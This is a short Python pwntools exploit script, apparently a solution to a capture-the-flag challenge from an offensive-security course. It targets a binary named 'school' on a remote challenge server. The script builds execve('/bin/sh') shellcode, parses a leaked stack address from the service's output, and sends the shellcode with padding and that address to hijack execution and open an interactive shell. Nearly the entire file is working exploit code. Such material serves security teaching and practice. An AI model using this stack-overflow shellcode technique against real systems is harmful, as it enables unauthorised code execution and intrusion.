from pwn import *

local = False

context.arch = "amd64"
context.os = "linux"
context.bits = 64
context.log_level="DEBUG"
context.terminal = ["tmux", "splitw", "-h", "-f"]

assembly =asm('''
mov rax, 0x3b
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall
''')

if local:
    p = gdb.debug("./school", '''
                              break main
                              continue
                              ''')
else:
    p=remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1338)

recieved = p.recvuntil(b"directions:\n").decode('utf-8')
print(recieved)
index_before = recieved.find("at: ")
index_after = recieved.find(". gimme")
hex_str = recieved[index_before+6:index_after]
hex_int = int(hex_str, 16)
print(hex_int)
jump_addr = hex_int.to_bytes(8, "little")

p.send(assembly + b'\x00'*3 + jump_addr + b"\n")
p.interactive()
